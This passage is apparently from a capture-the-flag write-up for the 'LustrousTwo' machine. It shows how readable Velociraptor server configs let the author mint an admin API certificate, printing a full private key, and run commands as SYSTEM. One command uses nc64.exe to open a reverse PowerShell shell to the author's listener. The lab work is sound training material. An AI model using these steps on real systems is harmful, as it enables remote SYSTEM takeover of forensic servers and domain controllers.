+<p>The <code class="language-plaintext highlighter-rouge">VelociraptorServer</code> directory has the binary, as well as config files for both the client and the server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Program Files\VelociraptorServer&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\Program Files\VelociraptorServer
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          9/6/2024   8:34 AM           2563 client.config.yaml
+-a----          9/6/2024   8:34 AM          12972 server.config.yaml
+-a----          9/6/2024   8:03 AM       60144064 velociraptor-v0.72.4-windows-amd64.exe
+</span></code></pre></div></div>
+<h3 id="abuse-velociraptor">Abuse Velociraptor</h3>
+<h4 id="access-api">Access API</h4>
+<p><a href="https://docs.velociraptor.app/">Velociraptor</a> is a digital forensics / incidence response tool from Rapid7 designed to collect data from endpoints.</p>
+<p>With access to both the config files, I am able to create an API key and get access to the Velociraptor API, which will allow me to execute commands on the system as the privileged user. This is all documented <a href="https://docs.velociraptor.app/docs/server_automation/server_api/">in the Velociraptor docs</a>.</p>
+<p>The <a href="https://docs.velociraptor.app/docs/server_automation/server_api/#creating-an-api-client-configuration">Creating an API client configuration section</a> shows how to do this running the <code class="language-plaintext highlighter-rouge">config api_client</code> command. I’ll need the following options as laid on in the docs:</p>
+<blockquote>
+<ol>
+<li><code class="language-plaintext highlighter-rouge">--config server.config.yaml</code>: load the server config which contains the CA private keys needed to sign a new minted certificate. This also allows the CLI command to create a new user in the server’s datastore.</li>
+<li><code class="language-plaintext highlighter-rouge">config api_client</code>: generate an api_client configuration, including client certificate.</li>
+<li><code class="language-plaintext highlighter-rouge">--name Mike</code>: Certificates represent user identities. The name of the certificate will be used to identify the caller and enforce ACLs on it. If the user does not exist then it will be created in the datastore and the server will need to be restarted for it to recognize the new user.</li>
+<li><code class="language-plaintext highlighter-rouge">--role administrator</code>: This option will also assign a role to the new identity. The role is used to test permissions of what the caller may do. If <code class="language-plaintext highlighter-rouge">--role</code> is specified then the user will be created on the server if it does not already exist. In the example above the user is granted the role <code class="language-plaintext highlighter-rouge">administrator</code> which includes all the permissions of the minimal API role <code class="language-plaintext highlighter-rouge">api</code> - see note below.</li>
+</ol>
+</blockquote>
+<p>One detail to notice is in the <code class="language-plaintext highlighter-rouge">--name</code> parameter. If the name given doesn’t exist, that user will be created in the database, but the server will need to be restarted before it will be recognized. As I don’t yet have a way to restart Velociraptor, I should find an existing user. Luckily, <code class="language-plaintext highlighter-rouge">server.config.yaml</code> has this section:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="na">initial_users</span><span class="pi">:</span>                                                              
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">admin</span>                                                               
+    <span class="na">password_hash</span><span class="pi">:</span> <span class="s">43b7f91087b5a1bcb978d776a23330d3bf4a2c31017c0b1865ddae21c942e06d</span>
+    <span class="na">password_salt</span><span class="pi">:</span> <span class="s">01e48c09468dcde741b493c49904cfdfcb4fa9a188efb27fa233e70265a6d4e5</span>
+</code></pre></div></div>
+<p>I’ll create a config for the admin user:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Program Files\VelociraptorServer&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\velociraptor-v0.72.4-windows-amd64.exe</span><span class="w"> </span><span class="nt">--config</span><span class="w"> </span><span class="nx">server.config.yaml</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">api_client</span><span class="w"> </span><span class="nt">--name</span><span class="w"> </span><span class="nx">admin</span><span class="w"> </span><span class="nt">--role</span><span class="w"> </span><span class="nx">administrator</span><span class="w"> </span><span class="nx">\programdata\api.config.yaml</span><span class="w">
+</span><span class="go">.\velociraptor-v0.72.4-windows-amd64.exe --config server.config.yaml config api_client --name admin --role administrator \programdata\api.config.yaml
+[ERROR] 2025-07-27T04:01:58-07:00 Unable to open file \\?\c:\datastore\config\inventory.json.db: open \\?\c:\datastore\config\inventory.json.db: Access is denied. 
+[ERROR] 2025-07-27T04:01:58-07:00 Unable to open file \\?\c:\datastore\config\inventory.json.db: open \\?\c:\datastore\config\inventory.json.db: Access is denied. 
+[ERROR] 2025-07-27T04:01:58-07:00 Unable to open file \\?\c:\datastore\config\inventory.json.db: open \\?\c:\datastore\config\inventory.json.db: Access is denied. 
+Creating API client file on \programdata\api.config.yaml.
+[ERROR] 2025-07-27T04:01:58-07:00 Unable to open file \\?\c:\datastore\acl\admin.json.db: open \\?\c:\datastore\acl\admin.json.db: Access is denied. 
+velociraptor-v0.72.4-windows-amd64.exe: error: config api_client: Unable to set role ACL: open \\?\c:\datastore\acl\admin.json.db: Access is denied.
+</span></code></pre></div></div>
+<p>There’s a couple errors, but the client config is still generated:</p>
+<div class="language-yml code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="na">ca_certificate</span><span class="pi">:</span> <span class="pi">|</span>
+  <span class="s">-----BEGIN CERTIFICATE-----</span>
+  <span class="s">MIIDSzCCAjOgAwIBAgIQIRnpQjrW1aIURqQbu2cKojANBgkqhkiG9w0BAQsFADAa</span>
+  <span class="s">MRgwFgYDVQQKEw9WZWxvY2lyYXB0b3IgQ0EwHhcNMjQwOTA2MTUzNDA0WhcNMzQw</span>
+  <span class="s">OTA0MTUzNDA0WjAaMRgwFgYDVQQKEw9WZWxvY2lyYXB0b3IgQ0EwggEiMA0GCSqG</span>
+  <span class="s">SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDjJw2CgQEZOA4WGz2iSi2Wre432XHGPNmS</span>
+  <span class="s">SCb47TG3BIW7YPvD73frcEhhX2ixWLXPpfs7qQdMe9Zi5rV16RgXw25R9x13awU5</span>
+  <span class="s">1J/KUeNiMxmrQB9KSCUHO3e8kDEuLC0wV26K76TVX8KIm0vklJP4mpv7Mj9CgHBN</span>
+  <span class="s">4qGwTqB1y7h2wyTanUJlwasY/lGU5u7w4wj2z6+OOOA+/S9NEiJ3Sw+fcd+dma2C</span>
+  <span class="s">kzqFEYioa3GED+veIfu+OFRyWaO3Pce2gV57ZXnli3AhtQMoFb1w5l6O5IQzhrKU</span>
+  <span class="s">7inc3KSb8kG+2vzQB4jwGLU0+wbSkyckXY+5592uIG3tVvdy+L9bAgMBAAGjgYww</span>
+  <span class="s">gYkwDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcD</span>
+  <span class="s">AjAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBTfTRyiGGBqOr5F541v8pOYkcFz</span>
+  <span class="s">ADAoBgNVHREEITAfgh1WZWxvY2lyYXB0b3JfY2EudmVsb2NpZGV4LmNvbTANBgkq</span>
+  <span class="s">hkiG9w0BAQsFAAOCAQEAt4tFN1KZF1wrmhOT/1f0DXnwgaACkhJmC2HARfp46hGY</span>
+  <span class="s">FvqumxwNkUTc0hyPdwK2iy+57RCTS70CgGvsvSf6bDx7jSBpBJ8KzYXxOwcNRPaK</span>
+  <span class="s">4KJV7ZQQA2U6ax3c5LNuUupY63tRh7j/AgeVvnVP8CLTEvWTHD1kEQ/cTyn0XDSn</span>
+  <span class="s">7yINImANYuWJkWO6i9eKXYxTGXWhG+n1xEmQvZIed8SsOyt/pvTbFnUtKNTokUnb</span>
+  <span class="s">B71PNi/CkZRJpULuAk9eJvLgKhEgIeVpY2rxYvVPBJNqwWwGypKOzWGX0+ueQReQ</span>
+  <span class="s">is5cJn9DbPiu82yg/HdQu9vfroG+QktqdZgx5KJkxA==</span>
+  <span class="s">-----END CERTIFICATE-----</span>
+<span class="na">client_cert</span><span class="pi">:</span> <span class="pi">|</span>
+  <span class="s">-----BEGIN CERTIFICATE-----</span>
+  <span class="s">MIIDPTCCAiWgAwIBAgIQIcjX4xAoEYwTIkJ9Kw7xiTANBgkqhkiG9w0BAQsFADAa</span>
+  <span class="s">MRgwFgYDVQQKEw9WZWxvY2lyYXB0b3IgQ0EwHhcNMjUwNzI3MTEwMTU4WhcNMjYw</span>
+  <span class="s">NzI3MTEwMTU4WjAnMRUwEwYDVQQKEwxWZWxvY2lyYXB0b3IxDjAMBgNVBAMTBWFk</span>
+  <span class="s">bWluMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtU9kejeRbSl40APZ</span>
+  <span class="s">NkcMU/BlJYYcbenrxSeUM6CLLKO07yHlOFAZVS7dhyMPsjgNxdFLxBMRhTUkbULy</span>
+  <span class="s">hRJr2ZyDqIZdqw4LBGAB8ezcJoP4nde4davlHze3IafMPk7Vuvhrcto0I6T8eQ2H</span>
+  <span class="s">qI812IFAPpMDeDMvEnvCzjpx6Gcmkm64QtXdTSq4B3wkCTjxcH8vPJhjWpbuadeW</span>
+  <span class="s">ogsmKQFrFwDJQ9evTEXbNh8f83QjG0PKTszWCOWscpogCQ8NXDfjCHFazqwiTkKk</span>
+  <span class="s">1vdpx+QGGsEJ0GyEaDybg/kGhHYxR2Zh9hJj1EbPNYLgTJ2nQSXPHAitW19aS1IQ</span>
+  <span class="s">dBTKKQIDAQABo3IwcDAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYIKwYBBQUH</span>
+  <span class="s">AwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHwYDVR0jBBgwFoAU300cohhgajq+</span>
+  <span class="s">ReeNb/KTmJHBcwAwEAYDVR0RBAkwB4IFYWRtaW4wDQYJKoZIhvcNAQELBQADggEB</span>
+  <span class="s">ANWI46UThc9UpMeOtNChkwj2eSpAVY9JyWtVafKGhG4KMQXbgO6aQUvfrJo2/MYR</span>
+  <span class="s">AFz9zFVvTK+DLQ0JPnB2/a9TM9EhxrmZLMrr6OHG+cdasoX8sgtQjElF6ajTq/Qp</span>
+  <span class="s">PcALskDccErjGE8DHQcZG9wHmPRbdhgNSKFl7y3FJJS+NHCWhnp05cFki1LjX9NR</span>
+  <span class="s">rl3ZOHUC5I1mFOckYcFtJQPxry6wuqD2ntc2ZHbSQZAlqfjtyUxGImxbvcsXLBrZ</span>
+  <span class="s">y5n+6RYu3ganZFpYU8H7Z91EBpRcwuXfkrvEI+U9Vvjc8a48RBzMejYrYvh4A0V6</span>
+  <span class="s">8oN94yMcjJuA2t03ayEIRpI=</span>
+  <span class="s">-----END CERTIFICATE-----</span>
+<span class="na">client_private_key</span><span class="pi">:</span> <span class="pi">|</span>
+  <span class="s">-----BEGIN RSA PRIVATE KEY-----</span>
+  <span class="s">MIIEpAIBAAKCAQEAtU9kejeRbSl40APZNkcMU/BlJYYcbenrxSeUM6CLLKO07yHl</span>
+  <span class="s">OFAZVS7dhyMPsjgNxdFLxBMRhTUkbULyhRJr2ZyDqIZdqw4LBGAB8ezcJoP4nde4</span>
+  <span class="s">davlHze3IafMPk7Vuvhrcto0I6T8eQ2HqI812IFAPpMDeDMvEnvCzjpx6Gcmkm64</span>
+  <span class="s">QtXdTSq4B3wkCTjxcH8vPJhjWpbuadeWogsmKQFrFwDJQ9evTEXbNh8f83QjG0PK</span>
+  <span class="s">TszWCOWscpogCQ8NXDfjCHFazqwiTkKk1vdpx+QGGsEJ0GyEaDybg/kGhHYxR2Zh</span>
+  <span class="s">9hJj1EbPNYLgTJ2nQSXPHAitW19aS1IQdBTKKQIDAQABAoIBAQCde2Qus+1g/9Cr</span>
+  <span class="s">/WvBtVyD3B4+xYoT/kaHbKVRYnUARQF3Y92RWCFo19ga9N1BU2bDF9PTbyyco1gM</span>
+  <span class="s">f0XfR+zdixDgZDUfyobPOgT2eWGPIrnjf+f8bV4KC37JgNHqnNcQG45YqCb5fui8</span>
+  <span class="s">zH+0bQ+8CigfMdqloO+WAmFmd2VREjDbNyAsvPae7Kq8ueOtLeKgcsmWEA5U4gEI</span>
+  <span class="s">qQd29vCoeVKpAlbDm21q5C5Gb1y//xIfXYQeXzxO12pLiZYw4s+fECuvz9C3BMjs</span>
+  <span class="s">6MLmyuXxxKU8MgaxoJOPR/xRx7Sf2b5eTdxuWuWiH50c2AtTZXYnZBItHUIazOJj</span>
+  <span class="s">UsOJS7/BAoGBAM6Y7dR7Vi5UDOFf7jINca7ZEMHlvbzLy+San/6a2WVIu7/xDFdp</span>
+  <span class="s">Y5QIgM65ekpehzH7kEk9GRNbGwQdV7txSF8C9Iz0Ugg/Z3E3X6tCOtHeBVtFSARW</span>
+  <span class="s">a4fSx/sfxdpkqy+lZ7BZ9hzgTkRSyAHsPPB79iTHO3I0MnL3oV58tU6dAoGBAOCq</span>
+  <span class="s">enPVwkNmZv3rApDB+RcaFA9KHE7t/SWSg2qfyIm+I2dR00Y0GbCP6NdoasB3NW14</span>
+  <span class="s">WiM9VALxoQawhH6OxvLXi8h88iZm8s55w5XMcLHnjjm3Rc/fCGSK04B0AxPE66DV</span>
+  <span class="s">lgWnKJ4ayQmLHmsfxq+f9QhRYub2+D6pffi7/q39AoGAHvzlP2e4h35n6C4hZjSK</span>
+  <span class="s">BrXcQ5kYGode780ZjnDfhsegEawwM7RFEWEtINTFOP5wvNiEzddyOWsC5F0aWa0m</span>
+  <span class="s">M8oXsES9QStxcpPhr6hhdjUdDJGZubzUqCy/fjVH0fgjjSP8J4F23uHuG2VnRpKO</span>
+  <span class="s">mWuegem4Sur1XjUyaR+/eikCgYEAqvtzqDa12v/TQEocMLk/boKNY7l+Y9+h+ndQ</span>
+  <span class="s">BtTGFXackSRoC5TZPFO53D5+iC3xfnfK+ejRyE/GwkWTAJJ+/RBoNNRKoklVXyiy</span>
+  <span class="s">Xo4x8mONDYXa3sIaLBKvtqIUOXZz8Xq76191fSZbfCThqJuNZdnx7TurbqXk9iOe</span>
+  <span class="s">WLASuq0CgYA/pq5nA1vBTsRxJT8joD+rK6QLOG9CgW8w4jzRMaN7yB4mXNfJUTES</span>
+  <span class="s">gXuDYrBDj475ZAqjQNK9gjTzkN6L/RDvcb/N322f7z7+XRdo2ios9VFFFfzXJfd2</span>
+  <span class="s">e9EQEmcGdkmUkw7mRWyIuTUJ38qFstafNQ5PswufIN2LyD+uOK2rdA==</span>
+  <span class="s">-----END RSA PRIVATE KEY-----</span>
+<span class="na">api_connection_string</span><span class="pi">:</span> <span class="s">localhost:8001</span>
+<span class="na">name</span><span class="pi">:</span> <span class="s">admin</span>
+</code></pre></div></div>
+<p>I’ll try the example command given in the docs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Program Files\VelociraptorServer&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\velociraptor-v0.72.4-windows-amd64.exe</span><span class="w"> </span><span class="nt">--api_config</span><span class="w"> </span><span class="nx">\programdata\api.config.yaml</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"SELECT * FROM info()"</span><span class="w"> </span><span class="nt">--format</span><span class="w"> </span><span class="nx">jsonl</span><span class="w">
+</span><span class="go">{"Hostname":"LUS2DC","Uptime":165963,"BootTime":1753448250,"Procs":93,"OS":"windows","Platform":"Microsoft Windows Server 2022 Standard","PlatformFamily":"Server (Domain Controller)","PlatformVersion":"10.0.20348 Build 20348","KernelVersion":"10.0.20348 Build 20348","VirtualizationSystem":"","VirtualizationRole":"","CompilerVersion":"go1.22.5","HostID":"d0d5360a-77d0-48bc-a8b0-0bef75954acb","Exe":"C:\\Program Files\\Velociraptor\\Velociraptor.exe","CWD":"C:\\Windows\\system32","IsAdmin":true,"ClientStart":"2025-07-25T12:57:53.2926437Z","Fqdn":"LUS2DC.Lustrous2.vl","Architecture":"amd64"}
+</span></code></pre></div></div>
+<p>It works!</p>
+<h4 id="execution">Execution</h4>
+<p>Velociraptor has a <a href="https://docs.velociraptor.app/vql_reference/popular/execve/">execve plugin</a>, similar to the <code class="language-plaintext highlighter-rouge">info()</code> plugin. I’ll run it as shown in the docs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Program Files\VelociraptorServer&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\velociraptor-v0.72.4-windows-amd64.exe</span><span class="w"> </span><span class="nt">--api_config</span><span class="w"> </span><span class="nx">\programdata\api.config.yaml</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"SELECT * FROM execve(argv=['powershell','-c','whoami'])"</span><span class="w"> 
+</span><span class="go">[
+ {
+  "Stdout": "nt authority\\system\r\n",
+  "Stderr": "",
+  "ReturnCode": 0,
+  "Complete": true
+ }
+]
+</span></code></pre></div></div>
+<p>It ran the command as NT Authority\System.</p>
+<p>I’ll run again, this time using <code class="language-plaintext highlighter-rouge">nc64.exe</code> to get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Program Files\VelociraptorServer&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\velociraptor-v0.72.4-windows-amd64.exe</span><span class="w"> </span><span class="nt">--api_config</span><span class="w"> </span><span class="nx">\programdata\api.config.yaml</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"SELECT * FROM execve(argv=['C:\\programdata\\nc64.exe','-e','powershell','10.10.14.79','443'])"</span><span class="w"> 
+</span></code></pre></div></div>
+<p>It just hangs, but at <code class="language-plaintext highlighter-rouge">nc</code> on my host:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.234.174 57745
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+</span><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\Administrator\Desktop&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
+</span><span class="go">0544d47f************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/07/31/htb-lustroustwo.html"></a>
+</article>
